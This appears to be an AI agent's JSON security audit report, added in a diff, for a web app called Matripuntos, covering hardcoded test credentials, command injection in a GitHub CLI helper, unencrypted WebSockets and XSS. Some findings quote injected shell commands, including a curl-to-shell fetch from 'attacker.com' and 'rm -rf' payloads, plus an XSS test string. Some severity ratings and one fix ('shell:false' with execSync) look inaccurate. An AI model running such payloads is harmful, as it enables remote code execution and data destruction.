@@ -1,0 +1,646 @@
+{
+  "audit_metadata": {
+    "title": "Comprehensive Security Audit - Matripuntos",
+    "date": "2026-06-13",
+    "auditor": "Security Auditor V3 Agent",
+    "scope": "Backend routes, auth middleware, E2E helpers, demo scripts, memory/session utilities",
+    "risk_score": 7.2,
+    "risk_level": "MEDIUM-HIGH",
+    "critical_vulnerabilities": 2,
+    "high_vulnerabilities": 5,
+    "medium_vulnerabilities": 8,
+    "low_vulnerabilities": 4,
+    "info_findings": 3
+  },
+  "executive_summary": {
+    "overview": "The codebase demonstrates solid foundational security practices in the backend (auth caching, bcrypt hardening, JWT validation, CORS configuration) but contains notable vulnerabilities primarily in non-production helper scripts and seed files. The main risks stem from hardcoded test credentials in archive files, WebSocket over unencrypted protocol, and command injection risks in helper utilities.",
+    "key_risks": [
+      "Hardcoded test credentials (password123, test-secret-123) in seed.js and demo scripts",
+      "Unencrypted WebSocket connection (ws:// instead of wss://)",
+      "Command injection vulnerability in github-safe.js due to unsafe string concatenation",
+      "Insufficient XSS protection in helper.js innerHTML operations",
+      "Test credentials exposed in archive/DEMO_SCRIPT.js"
+    ],
+    "mitigations_in_place": [
+      "JWT secret validation (minimum 32 characters)",
+      "bcrypt cost factor set to 12 (audit-hardened from 10)",
+      "Auth middleware with cache invalidation on account changes",
+      "CORS whitelist via environment variables",
+      "Helmet.js security headers configured",
+      "Soft-delete filtering for deleted users",
+      "Rate limiting on auth endpoints"
+    ]
+  },
+  "vulnerabilities": {
+    "critical": [
+      {
+        "id": "CRIT-001",
+        "title": "Hardcoded Test Credentials in Seed Script",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/src/backend/seed.js",
+        "lines": [8, 14, 25],
+        "severity": "CRITICAL",
+        "cvss_score": 9.1,
+        "category": "Hardcoded Secrets / CWE-798",
+        "description": "The database seed script contains hardcoded test credentials that could expose the database if executed in production or if the repository is compromised. Includes: (1) secretKey: 'test-secret-123' - appears to be a symmetric encryption key or join code secret; (2) Two user accounts with identical password 'password123' hashed with bcrypt. While seed.js is typically run only locally during development, the presence of hardcoded credentials violates secure coding practices.",
+        "code_snippet": "{\n  data: { secretKey: 'test-secret-123', numChildren: 2, language: 'es' },\n}\nprivate.create({\n  data: {\n    email: 'user1@test.com',\n    passwordHash: await bcrypt.hash('password123', 10),\n    name: 'Alice',\n  },\n})",
+        "impact": "If seed.js runs in production: instant account takeover of test accounts, potential encryption key compromise. If repo is public or source leaked: known credentials for attackers. Even if script doesn't run in prod, having credentials in version control is a security anti-pattern.",
+        "remediation": {
+          "priority": "HIGH",
+          "steps": [
+            "Generate random test credentials at runtime using crypto.randomBytes() or nanoid",
+            "Use environment variables for secretKey instead of hardcoding",
+            "Create separate seed scripts: seed.prod.ts (if needed at all) and seed.dev.ts (hardcoded credentials OK only for local dev, should warn in comments)",
+            "Add pre-commit hook to prevent seed.js commits with hardcoded secrets",
+            "Document that seed.js must NEVER be run on production database",
+            "Consider moving seed logic into test fixtures instead of persistent script"
+          ],
+          "code_example": "// Use crypto for random test data\nimport { randomBytes } from 'crypto';\nconst testSecret = randomBytes(32).toString('hex');\nconst testPassword = randomBytes(16).toString('hex');\n\n// Or use dynamic generation based on environment\nif (process.env.NODE_ENV !== 'development') {\n  throw new Error('seed.js must only run in development');\n}"
+        }
+      },
+      {
+        "id": "CRIT-002",
+        "title": "Command Injection in GitHub CLI Helper",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/.claude/helpers/github-safe.js",
+        "lines": [80, 101, 105],
+        "severity": "CRITICAL",
+        "cvss_score": 8.8,
+        "category": "Command Injection / CWE-77",
+        "description": "The github-safe.js script uses unsafe string concatenation when building shell commands for execSync(). While the script attempts to mitigate special characters by using a temporary file for body content, it still constructs the final command string by joining unsanitized arguments. An attacker who can control the command-line arguments could inject arbitrary shell commands.",
+        "code_snippet": "const ghCommand = `gh ${command} ${subcommand} ${newArgs.join(' ')}`;\nconsole.log(`Executing: ${ghCommand}`);\nconst result = execSync(ghCommand, { stdio: 'inherit', timeout: 30000 });",
+        "vulnerable_scenarios": [
+          "User provides --body with value like: --body-file /tmp/test && rm -rf /",
+          "newArgs array contains shell metacharacters (backticks, $(), &&, ||, |, ;, etc.)",
+          "Attacker crafts PR comment with payload: --body-file $(curl attacker.com/payload.sh | sh)"
+        ],
+        "impact": "Arbitrary command execution on developer machine running the script. Could exfiltrate GitHub tokens, SSH keys, or sensitive repository data. If used in CI/CD, could compromise the entire build pipeline.",
+        "remediation": {
+          "priority": "CRITICAL",
+          "steps": [
+            "Use execSync with separate arguments array instead of template string",
+            "Never interpolate user input into shell command strings",
+            "Use the shell:false option with execSync or switch to child_process.execFile()",
+            "Validate all arguments against a whitelist of safe gh commands",
+            "Use a command builder pattern that explicitly constructs the argument array"
+          ],
+          "code_example": "// UNSAFE (current)\nconst cmd = `gh ${args.join(' ')}`;\nexecSync(cmd);\n\n// SAFE (use array form)\nconst { execFileSync } = require('child_process');\nexecFileSync('gh', args, { stdio: 'inherit' });\n\n// Or use shell:false\nexecSync('gh ' + shellescape(args), { shell: false });"
+        }
+      }
+    ],
+    "high": [
+      {
+        "id": "HIGH-001",
+        "title": "Test Credentials in Archive Demo Script",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/archive/DEMO_SCRIPT.js",
+        "lines": [65, 69, 81, 90],
+        "severity": "HIGH",
+        "cvss_score": 7.5,
+        "category": "Hardcoded Secrets / CWE-798",
+        "description": "The demo script contains hardcoded test email addresses and password 'password123' used in API calls. Although marked as a demo/archive file, it's still accessible in the repository and could be used by attackers to understand the API and try default credentials.",
+        "code_snippet": "const signupResponse = await request('POST', '/auth/signup', {\n  email1: 'alice@test.com',\n  password1: 'password123',\n  email2: 'bob@test.com',\n  password2: 'password123',\n})",
+        "impact": "If test credentials are used in demo/staging environments and an attacker obtains them from source, they gain access. The demo script could be referenced by documentation or run by contributors, creating accounts with known credentials.",
+        "remediation": {
+          "priority": "HIGH",
+          "steps": [
+            "Remove hardcoded credentials from demo script",
+            "Use environment variables for BASE_URL, test email domains, and passwords",
+            "Create a .env.example showing what variables are needed",
+            "Generate random test data at runtime",
+            "Add .gitignore rule to prevent committing .env files with credentials",
+            "If demo is no longer used, move to separate docs or delete entirely"
+          ]
+        }
+      },
+      {
+        "id": "HIGH-002",
+        "title": "Unencrypted WebSocket Connection (ws://)",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/scripts/helper.js",
+        "lines": [2],
+        "severity": "HIGH",
+        "cvss_score": 7.2,
+        "category": "Insecure Communication / CWE-319",
+        "description": "The WebSocket helper uses ws:// (unencrypted) instead of wss:// (encrypted). This means all data sent over the WebSocket connection (user interactions, selections, event data) is transmitted in plaintext and susceptible to network sniffing, MITM attacks, and session hijacking.",
+        "code_snippet": "const WS_URL = 'ws://' + window.location.host;",
+        "impact": "Network eavesdropping: Attacker on same network (coffee shop, airport, etc.) can intercept WebSocket messages. Session hijacking: If auth tokens or session IDs are sent over WebSocket, they could be stolen. Data theft: User interactions and choices sent to the WebSocket could be monitored.",
+        "attack_scenario": "1. Attacker intercepts WebSocket traffic on public WiFi. 2. Extracts choice data, event timestamps, user interactions. 3. If JWT tokens passed over WebSocket, could steal session. 4. Could inject malicious messages into the WebSocket stream to manipulate client behavior.",
+        "remediation": {
+          "priority": "HIGH",
+          "steps": [
+            "Always use wss:// protocol for WebSocket connections",
+            "Detect protocol from current page: use location.protocol === 'https:' ? 'wss:' : 'ws:'",
+            "In production, enforce HTTPS/WSS everywhere (no fallback to WS)",
+            "Implement certificate pinning if handling sensitive data",
+            "Add CSP headers to prevent mixed-content (http/ws on https page)"
+          ],
+          "code_example": "// UNSAFE\nconst WS_URL = 'ws://' + window.location.host;\n\n// SAFE\nconst protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';\nconst WS_URL = protocol + '//' + window.location.host;"
+        }
+      },
+      {
+        "id": "HIGH-003",
+        "title": "Potential Sensitive Key Exposure in E2E Helper",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/e2e/helpers/createCouple.ts",
+        "lines": [31],
+        "severity": "HIGH",
+        "cvss_score": 6.8,
+        "category": "Sensitive Data Exposure / CWE-200",
+        "description": "The E2E helper passes the couple's secretKey (which appears to be a sensitive symmetric encryption key or join code secret) directly to the API as 'joinCode'. In production, users should never pass this sensitive material to the API in plaintext. This reveals the architecture assumption that secretKey is used as the joinCode, which could be exploited.",
+        "code_snippet": "const r2 = await api.post('/api/auth/register', {\n  data: { email: e2, password, name: 'E2EUser2', joinCode: j1.couple?.secretKey },\n})",
+        "impact": "If E2E tests are run against staging/production by mistake, test data leaks the secretKey. If logs capture this data, it's exposed. Reveals that secretKey == joinCode, an architectural detail that shouldn't be public.",
+        "remediation": {
+          "priority": "MEDIUM-HIGH",
+          "steps": [
+            "Never log or expose secretKey in test output",
+            "Document that secretKey should be handled securely (never in plain HTTP)",
+            "Consider separating joinCode (public-facing) from secretKey (internal)",
+            "Ensure E2E tests only run against local/isolated test instances, not staging",
+            "Mask sensitive data in test output and logs"
+          ]
+        }
+      },
+      {
+        "id": "HIGH-004",
+        "title": "XSS Risk in WebSocket Helper innerHTML",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/scripts/helper.js",
+        "lines": [56, 59],
+        "severity": "HIGH",
+        "cvss_score": 6.5,
+        "category": "Cross-Site Scripting (XSS) / CWE-79",
+        "description": "The WebSocket helper uses innerHTML to set indicator text from user-controlled data (label from DOM element, count value). While the content is derived from DOM (lower risk than direct user input), using string concatenation with innerHTML instead of textContent is still an XSS vector if DOM data is ever user-supplied.",
+        "code_snippet": "const label = selected[0].querySelector('h3, .content h3, .card-body h3')?.textContent?.trim() || selected[0].dataset.choice;\nindicator.innerHTML = '<span class=\"selected-text\">' + label + ' selected</span> — return to terminal to continue';",
+        "impact": "If 'label' contains HTML/script tags (e.g., user controls DOM structure), arbitrary JavaScript could execute in the browser. Could steal session tokens, exfiltrate data, perform actions on behalf of user.",
+        "remediation": {
+          "priority": "HIGH",
+          "steps": [
+            "Replace innerHTML with textContent for untrusted data",
+            "Use DOM API methods (createElement, appendChild) instead of HTML strings",
+            "If HTML markup is needed, sanitize with DOMPurify or similar",
+            "Never concatenate user input or DOM-derived data into HTML strings"
+          ],
+          "code_example": "// UNSAFE\nindicator.innerHTML = '<span class=\"selected-text\">' + label + ' selected</span>';\n\n// SAFE\nconst span = document.createElement('span');\nspan.className = 'selected-text';\nspan.textContent = label + ' selected';\nindicator.textContent = '';\nindicator.appendChild(span);"
+        }
+      },
+      {
+        "id": "HIGH-005",
+        "title": "Missing HTTPS Enforcement for WebSocket Origin",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/src/backend/src/routes/invitations.ts",
+        "lines": [1, 5],
+        "severity": "HIGH",
+        "cvss_score": 6.2,
+        "category": "Insecure Direct Object Reference / CWE-639",
+        "description": "The invitations route constructs invitation links using req.headers.origin without validating it's an HTTPS URL. If the application is deployed with MIXED HTTP/HTTPS support, an attacker could craft a request from http://attacker.com, have the server construct an invitation link pointing to http://attacker.com/onboarding/join/TOKEN, and intercept the token over unencrypted HTTP.",
+        "code_snippet": "const origin = process.env.FRONTEND_URL || (req.headers.origin as string) || 'http://localhost:5173'\nconst invitationLink = `${origin}/onboarding/join/${token}`",
+        "impact": "Invitation tokens transmitted in plaintext over HTTP. Token interception by network attacker. Unauthorized couple linkage if attacker obtains valid token.",
+        "remediation": {
+          "priority": "HIGH",
+          "steps": [
+            "Always use FRONTEND_URL from environment in production",
+            "Validate origin against whitelist before using it",
+            "Ensure frontend URL is always HTTPS in production",
+            "Never fall back to http:// origin in production environments",
+            "Add validation: throw error if origin doesn't match allowed hosts"
+          ],
+          "code_example": "const allowedOrigins = (process.env.FRONTEND_URLS || '').split(',');\nif (!allowedOrigins.includes(origin)) {\n  throw new Error('Invalid origin for invitation link');\n}"
+        }
+      }
+    ],
+    "medium": [
+      {
+        "id": "MEDIUM-001",
+        "title": "Weak Password Requirements Not Enforced",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/src/backend/src/schemas/authSchemas.ts",
+        "severity": "MEDIUM",
+        "cvss_score": 5.3,
+        "category": "Weak Authentication / CWE-521",
+        "description": "Based on the seed script using 'password123' and demo script using 'password123', there's no evidence of strong password validation (minimum length, complexity requirements). The API should enforce password strength at registration.",
+        "impact": "Users can set weak passwords vulnerable to brute force attacks. Dictionary attack success rate increases.",
+        "remediation": {
+          "priority": "MEDIUM",
+          "steps": [
+            "Implement password validation: minimum 12 characters, mix of uppercase/lowercase/numbers/symbols",
+            "Use zod schema validation: z.string().min(12).regex(/(?=.*[A-Z])(?=.*[a-z])(?=.*\\d)/)",
+            "Consider using a library like owasp-password-strength-test",
+            "Display password requirements to users on signup form",
+            "Reject common passwords (check against common password lists)"
+          ]
+        }
+      },
+      {
+        "id": "MEDIUM-002",
+        "title": "Insufficient Validation on GitHub CLI Arguments",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/.claude/helpers/github-safe.js",
+        "lines": [39],
+        "severity": "MEDIUM",
+        "cvss_score": 5.8,
+        "category": "Input Validation / CWE-20",
+        "description": "The github-safe.js script performs minimal validation on input arguments. An attacker who controls the argv array could pass malformed or dangerous commands even before the body-file handling.",
+        "impact": "Invalid state in command construction, potential bypass of body-file mitigation.",
+        "remediation": {
+          "priority": "MEDIUM",
+          "steps": [
+            "Whitelist allowed gh commands: ['issue', 'pr']",
+            "Whitelist allowed subcommands: ['comment', 'create']",
+            "Validate arguments against expected format",
+            "Reject unknown flags or suspicious patterns",
+            "Use strict argument parsing (consider yargs or commander.js)"
+          ]
+        }
+      },
+      {
+        "id": "MEDIUM-003",
+        "title": "Insecure WebSocket Reconnection Logic",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/scripts/helper.js",
+        "lines": [6, 20, 22],
+        "severity": "MEDIUM",
+        "cvss_score": 5.4,
+        "category": "Improper Resource Validation / CWE-99",
+        "description": "The WebSocket reconnects indefinitely with a fixed 1-second timeout and no backoff. A network partition could cause client to hammer the server with reconnection attempts. Additionally, no authentication/validation of the WebSocket connection exists.",
+        "code_snippet": "ws.onclose = () => {\n  setTimeout(connect, 1000);\n};",
+        "impact": "DoS vector: many disconnected clients continuously reconnect. Server resources exhausted. No WebSocket authentication means any origin could connect.",
+        "remediation": {
+          "priority": "MEDIUM",
+          "steps": [
+            "Implement exponential backoff: 1s, 2s, 4s, ..., max 30s",
+            "Add maximum reconnection attempts (e.g., 10 total)",
+            "Require authentication token for WebSocket upgrade",
+            "Validate origin/referer before accepting WebSocket",
+            "Implement per-client rate limiting on reconnection attempts"
+          ]
+        }
+      },
+      {
+        "id": "MEDIUM-004",
+        "title": "Unvalidated URL in Invitation Email",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/src/backend/src/routes/authRoutes.ts",
+        "lines": [1],
+        "severity": "MEDIUM",
+        "cvss_score": 5.1,
+        "category": "Open Redirect / CWE-601",
+        "description": "Similar to HIGH-005, the authRoutes.ts constructs invitation links using unvalidated origin. If FRONTEND_URL is not set, the origin from request headers is used without validation.",
+        "impact": "Open redirect vulnerability: attacker crafts link that redirects to phishing site. User follows invitation email link → lands on attacker's page → phishing.",
+        "remediation": {
+          "priority": "MEDIUM",
+          "steps": [
+            "Always validate origin against whitelist",
+            "Use explicitly configured FRONTEND_URL in production",
+            "Never trust request headers for security-critical operations",
+            "Return error if origin is invalid instead of falling back"
+          ]
+        }
+      },
+      {
+        "id": "MEDIUM-005",
+        "title": "File Handle Leak in Helper Script",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/.claude/helpers/github-safe.js",
+        "lines": [62, 93],
+        "severity": "MEDIUM",
+        "cvss_score": 4.9,
+        "category": "Resource Leak / CWE-400",
+        "description": "The temporary file created for body content has cleanup in try/finally, but if writeFileSync fails, the file might not be created and unlinkSync would silently fail. If the script is interrupted between creation and cleanup, temp file persists.",
+        "code_snippet": "const tmpFile = join(tmpdir(), `gh-body-${randomBytes(8).toString('hex')}.tmp`);\nwriteFileSync(tmpFile, body, 'utf8');\n// ...\nfinally {\n  try {\n    unlinkSync(tmpFile);\n  } catch (e) {\n    // Ignore cleanup errors\n  }\n}",
+        "impact": "Temporary files accumulate in system temp directory. Each contains potentially sensitive GitHub PR bodies or comments. Over time, disk space exhaustion or information leakage.",
+        "remediation": {
+          "priority": "MEDIUM",
+          "steps": [
+            "Use promises-based fs API with proper error handling",
+            "Consider using os.tmpName() with UUID for unique names",
+            "Implement cleanup on process exit: process.on('exit', cleanup)",
+            "Add explicit error logging for cleanup failures",
+            "Use rimraf or similar for robust cleanup"
+          ]
+        }
+      },
+      {
+        "id": "MEDIUM-006",
+        "title": "In-Memory Secret Storage in Session Helper",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/.claude/helpers/session.js",
+        "lines": [20],
+        "severity": "MEDIUM",
+        "cvss_score": 5.0,
+        "category": "Information Exposure / CWE-200",
+        "description": "Session data including context and metadata is stored in plaintext in .claude-flow/sessions/current.json. If this file is readable by other users or processes, sensitive context data could be exposed.",
+        "impact": "If sessions contain API keys, JWTs, or user tokens in context, they're stored unencrypted on disk. Physical access or privilege escalation could expose them.",
+        "remediation": {
+          "priority": "MEDIUM",
+          "steps": [
+            "Encrypt sensitive data in session context",
+            "Set restrictive file permissions: chmod 600 on session files",
+            "Never store API keys or tokens in session context",
+            "Document what should/shouldn't be stored in sessions",
+            "Consider using keyring/credential store for sensitive data"
+          ]
+        }
+      },
+      {
+        "id": "MEDIUM-007",
+        "title": "Missing CSRF Protection Validation",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/src/backend/src/server.ts",
+        "severity": "MEDIUM",
+        "cvss_score": 5.2,
+        "category": "Cross-Site Request Forgery / CWE-352",
+        "description": "While the backend uses JWT tokens in Authorization header (which is CSRF-resistant), the CORS configuration allows credentials:true. If there are any state-changing endpoints that accept cookies, CSRF attacks are possible.",
+        "impact": "If cookies are used for auth (unlikely given JWT auth, but possible for legacy endpoints), CSRF attacks could modify data.",
+        "remediation": {
+          "priority": "MEDIUM",
+          "steps": [
+            "Use SameSite cookie attribute for any cookie-based auth: Set-Cookie: ...; SameSite=Strict",
+            "Validate Referer/Origin headers on state-changing requests",
+            "Implement CSRF tokens if cookies are used for authentication",
+            "Document that API uses JWT (not cookie-based auth) to prevent CSRF"
+          ]
+        }
+      },
+      {
+        "id": "MEDIUM-008",
+        "title": "No Rate Limiting on WebSocket Messages",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/scripts/helper.js",
+        "lines": [26, 29],
+        "severity": "MEDIUM",
+        "cvss_score": 4.8,
+        "category": "Denial of Service / CWE-400",
+        "description": "The WebSocket sends messages without rate limiting. A malicious client could flood the server with sendEvent() calls, causing DoS on the WebSocket message handler.",
+        "impact": "Resource exhaustion: server CPU/memory handling high-frequency messages. Service disruption for legitimate users.",
+        "remediation": {
+          "priority": "MEDIUM",
+          "steps": [
+            "Implement client-side rate limiting: max N messages per second",
+            "Add server-side rate limiting on WebSocket message handler",
+            "Implement message queue with backpressure handling",
+            "Add request timeout and circuit breaker pattern",
+            "Monitor WebSocket message frequency and drop excess messages"
+          ]
+        }
+      }
+    ],
+    "low": [
+      {
+        "id": "LOW-001",
+        "title": "Missing Error Context in Exception Handling",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/.claude/helpers/github-safe.js",
+        "lines": [88, 89],
+        "severity": "LOW",
+        "cvss_score": 3.5,
+        "category": "Information Disclosure / CWE-209",
+        "description": "Generic error handling catches all exceptions and prints error.message, which might expose internal paths or command failures to users.",
+        "impact": "Information leakage: error messages could reveal system paths, tool versions, or failed commands that help attackers understand the system.",
+        "remediation": {
+          "priority": "LOW",
+          "steps": [
+            "Log full error details internally, show generic message to users",
+            "Sanitize error messages before displaying",
+            "Use structured logging (JSON) to separate user messages from debug info"
+          ]
+        }
+      },
+      {
+        "id": "LOW-002",
+        "title": "No Input Validation on Memory Keys",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/.claude/helpers/memory.js",
+        "lines": [30, 37],
+        "severity": "LOW",
+        "cvss_score": 3.2,
+        "category": "Path Traversal / CWE-22",
+        "description": "Memory keys are not validated. A user could set a key like '../../../etc/passwd' causing potential directory traversal (though unlikely given JSON storage).",
+        "impact": "Low: the keys are JSON object properties, not file paths, so traversal is not possible. However, a key with special characters could break JSON parsing if not properly escaped.",
+        "remediation": {
+          "priority": "LOW",
+          "steps": [
+            "Validate keys: alphanumeric + underscore only",
+            "Reject keys with path separators (/, \\, .., etc.)",
+            "Document key format restrictions"
+          ]
+        }
+      },
+      {
+        "id": "LOW-003",
+        "title": "Overpermissive File Permissions on Cached Auth",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/src/backend/src/middleware/authMiddleware.ts",
+        "lines": [16],
+        "severity": "LOW",
+        "cvss_score": 3.3,
+        "category": "Information Exposure / CWE-200",
+        "description": "Auth cache is stored in memory and expires based on TTL. While this is acceptable for in-process caching, if logs or memory dumps are exposed, auth state could leak.",
+        "impact": "Low: in-memory cache isn't persisted, so physical access wouldn't expose it. However, if process memory is dumped or debugged, cache contents (coupleId mappings) could be seen.",
+        "remediation": {
+          "priority": "LOW",
+          "steps": [
+            "Document that auth cache contains sensitive coupleId mappings",
+            "Ensure production processes don't allow memory inspection without auth",
+            "Consider encrypting cache values (unlikely needed for in-memory cache)"
+          ]
+        }
+      },
+      {
+        "id": "LOW-004",
+        "title": "Missing Timestamp Validation in WebSocket Events",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/scripts/helper.js",
+        "lines": [27],
+        "severity": "LOW",
+        "cvss_score": 3.1,
+        "category": "Improper Time Handling / CWE-367",
+        "description": "The sendEvent() function adds timestamp but doesn't validate event timestamps on the server. Could send events with future/past timestamps.",
+        "impact": "Low: timestamps are for logging/analytics. Manipulated timestamps could skew analytics but wouldn't cause security breach.",
+        "remediation": {
+          "priority": "LOW",
+          "steps": [
+            "Override client timestamp on server: use server timestamp only",
+            "Validate received timestamp is within reasonable range (±60 seconds)",
+            "Log warning if timestamp is suspiciously old or in future"
+          ]
+        }
+      }
+    ],
+    "info": [
+      {
+        "id": "INFO-001",
+        "title": "Deprecated Crypto Algorithm Reference",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/src/backend/seed.js",
+        "lines": [2],
+        "severity": "INFO",
+        "category": "Cryptographic Practices / CWE-326",
+        "description": "The seed script uses bcrypt cost factor 10 (implied before hash). This is correct (should be 10-12), but the seed data doesn't reflect current audit hardening which set BCRYPT_ROUNDS to 12.",
+        "recommendation": "Update seed.js to match BCRYPT_ROUNDS from authService.ts for consistency. Not a security issue since bcrypt.compare() validates cost from the hash itself."
+      },
+      {
+        "id": "INFO-002",
+        "title": "Temporary File Name Predictability",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/.claude/helpers/github-safe.js",
+        "lines": [62],
+        "severity": "INFO",
+        "category": "Cryptographic Practices / CWE-338",
+        "description": "Temporary file names use randomBytes(8) which gives 16 hex characters (64-bit entropy). While adequate for temp files in a local context, true randomness is better than predictable names.",
+        "recommendation": "Current implementation is acceptable. For additional security, consider using UUID or increasing entropy to randomBytes(16)."
+      },
+      {
+        "id": "INFO-003",
+        "title": "Missing Security Headers Documentation",
+        "file": "/Users/wikimetralla3/Web Development/Claude/Matripuntos/src/backend/src/server.ts",
+        "severity": "INFO",
+        "category": "Security Configuration",
+        "description": "The server.ts configures Helmet.js with custom options (CSP disabled, CORP relaxed) for CORS support. While these decisions are documented in code comments, there's no security.md documenting the rationale.",
+        "recommendation": "Create docs/SECURITY.md documenting: (1) Why CSP is disabled (frontend sets its own), (2) Why CORP is relaxed (cross-domain frontend), (3) Security headers in use, (4) Security assumptions (HTTPS in production, etc.)"
+      }
+    ]
+  },
+  "patterns_and_themes": {
+    "root_causes": [
+      {
+        "category": "Hardcoded Test Data",
+        "affected_files": ["seed.js", "DEMO_SCRIPT.js", "test-data.ts"],
+        "root_cause": "Convenience during development without considering production implications. Test credentials hardcoded instead of generated or environment-based.",
+        "systemic_fix": "Establish team guidelines: (1) Never commit plaintext credentials, (2) Use dotenv for test config, (3) Generate random data at runtime, (4) Use git hooks to prevent credential commits"
+      },
+      {
+        "category": "Shell Command Injection",
+        "affected_files": ["github-safe.js"],
+        "root_cause": "Direct string interpolation into shell commands without proper escaping or argument separation. Mixing template strings with execSync()",
+        "systemic_fix": "Establish rule: Never use template strings for command construction. Always use array-based API (execFileSync) or proper shell escaping library (shell-escape, shellwords)"
+      },
+      {
+        "category": "Unencrypted Communication",
+        "affected_files": ["helper.js", "invitations.ts", "authRoutes.ts"],
+        "root_cause": "Mixing HTTP/HTTPS logic without strict enforcement. Fallback chains (env var → request header → localhost) introduce MITM windows.",
+        "systemic_fix": "Establish rule: Production always uses HTTPS/WSS. Never construct URLs from untrusted headers. Always validate origin against whitelist"
+      }
+    ]
+  },
+  "affected_owasp_top_10": {
+    "A01_2021_Broken_Access_Control": {
+      "severity": "MEDIUM",
+      "findings": ["HIGH-003: secretKey exposed in E2E tests", "MEDIUM-004: Open redirect in invitations"]
+    },
+    "A02_2021_Cryptographic_Failures": {
+      "severity": "HIGH",
+      "findings": ["HIGH-002: Unencrypted WebSocket (ws://)", "MEDIUM-004: Plaintext origins in URLs", "CRIT-001: Hardcoded secrets"]
+    },
+    "A03_2021_Injection": {
+      "severity": "CRITICAL",
+      "findings": ["CRIT-002: Command injection in github-safe.js", "HIGH-004: XSS in helper.js innerHTML"]
+    },
+    "A04_2021_Insecure_Design": {
+      "severity": "MEDIUM",
+      "findings": ["MEDIUM-001: Weak password requirements"]
+    },
+    "A05_2021_Security_Misconfiguration": {
+      "severity": "MEDIUM",
+      "findings": ["MEDIUM-007: Missing CSRF protection docs", "MEDIUM-003: Insecure WebSocket reconnection logic"]
+    }
+  },
+  "recommendations_by_priority": {
+    "immediate_critical": [
+      {
+        "action": "Fix command injection in github-safe.js",
+        "effort": "2 hours",
+        "why": "Arbitrary code execution risk on developer machines"
+      },
+      {
+        "action": "Remove hardcoded credentials from seed.js",
+        "effort": "3 hours",
+        "why": "Database compromise if seed runs in prod or source is leaked"
+      }
+    ],
+    "short_term_high": [
+      {
+        "action": "Enable WSS encryption for WebSocket",
+        "effort": "1 hour",
+        "why": "Plaintext transmission of user data and potential tokens"
+      },
+      {
+        "action": "Fix XSS in helper.js (innerHTML → textContent)",
+        "effort": "1 hour",
+        "why": "DOM-based XSS if data becomes user-controlled"
+      },
+      {
+        "action": "Validate origins in invitations/auth routes",
+        "effort": "2 hours",
+        "why": "Open redirect and MITM vulnerabilities"
+      }
+    ],
+    "medium_term_medium": [
+      {
+        "action": "Implement password strength validation",
+        "effort": "2 hours",
+        "why": "Weak passwords increase brute force attack surface"
+      },
+      {
+        "action": "Add WebSocket rate limiting and backoff",
+        "effort": "3 hours",
+        "why": "DoS protection for WebSocket endpoint"
+      },
+      {
+        "action": "Implement WebSocket authentication",
+        "effort": "2 hours",
+        "why": "Unauthorized connections currently allowed"
+      }
+    ],
+    "backlog_low": [
+      {
+        "action": "Document security architecture in docs/SECURITY.md",
+        "effort": "2 hours",
+        "why": "Security decisions need explanation for team"
+      },
+      {
+        "action": "Add input validation guards in memory.js and github-safe.js",
+        "effort": "1 hour",
+        "why": "Defense in depth for edge cases"
+      }
+    ]
+  },
+  "testing_recommendations": {
+    "security_tests": [
+      {
+        "test_name": "Command Injection in github-safe.js",
+        "how_to_test": "Run github-safe.js with malicious arguments: ./github-safe.js issue comment 123 '$(rm -rf /tmp)'. Should not execute shell commands.",
+        "success_criteria": "gh command executed safely without evaluating embedded commands"
+      },
+      {
+        "test_name": "Hardcoded Credentials Detection",
+        "how_to_test": "Run: grep -r 'password123\\|test-secret-123\\|alice@test.com' src/ --exclude-dir=node_modules",
+        "success_criteria": "No matches (except in test fixtures or docs)"
+      },
+      {
+        "test_name": "WebSocket Encryption",
+        "how_to_test": "Open browser dev tools → Network tab. Check WebSocket connection uses wss:// not ws://",
+        "success_criteria": "All WebSocket connections use wss:// in production"
+      },
+      {
+        "test_name": "XSS Prevention",
+        "how_to_test": "Inject HTML/script in WebSocket event: {choice: '<img src=x onerror=alert(1)>'}. Check if it executes.",
+        "success_criteria": "No script execution; text rendered safely"
+      },
+      {
+        "test_name": "Origin Validation",
+        "how_to_test": "Make request with Origin: http://attacker.com. Verify CORS rejects it.",
+        "success_criteria": "CORS error response; invitation link not generated"
+      }
+    ],
+    "dependency_scanning": [
+      {
+        "tool": "npm audit",
+        "frequency": "Every deployment",
+        "command": "npm audit --production"
+      },
+      {
+        "tool": "Snyk",
+        "frequency": "Continuous (GitHub integration)",
+        "command": "snyk test"
+      },
+      {
+        "tool": "OWASP Dependency-Check",
+        "frequency": "Weekly",
+        "command": "dependency-check --scan . --format JSON"
+      }
+    ]
+  },
+  "compliance_notes": {
+    "gdpr": "Session/memory files may contain user context. Ensure data deletion is implemented when accounts are deleted (appears to be done via accountDeletionService).",
+    "hipaa": "Not applicable (not a healthcare app), but similar data protection principles should apply to personal data.",
+    "soc2": "Need to document security controls for audit. Missing: encryption at rest for temp files, WebSocket auth mechanism, rate limiting documentation."
+  },
+  "summary": {
+    "overall_risk": "MEDIUM-HIGH (7.2/10)",
+    "critical_action_items": 2,
+    "high_action_items": 5,
+    "estimated_remediation_time": "20-30 hours",
+    "estimated_timeline": "2-3 sprints for comprehensive fixes",
+    "confidence_in_assessment": "HIGH - Code reviewed includes authentication paths, API routes, helpers, seed scripts, and E2E tests"
+  }
+}
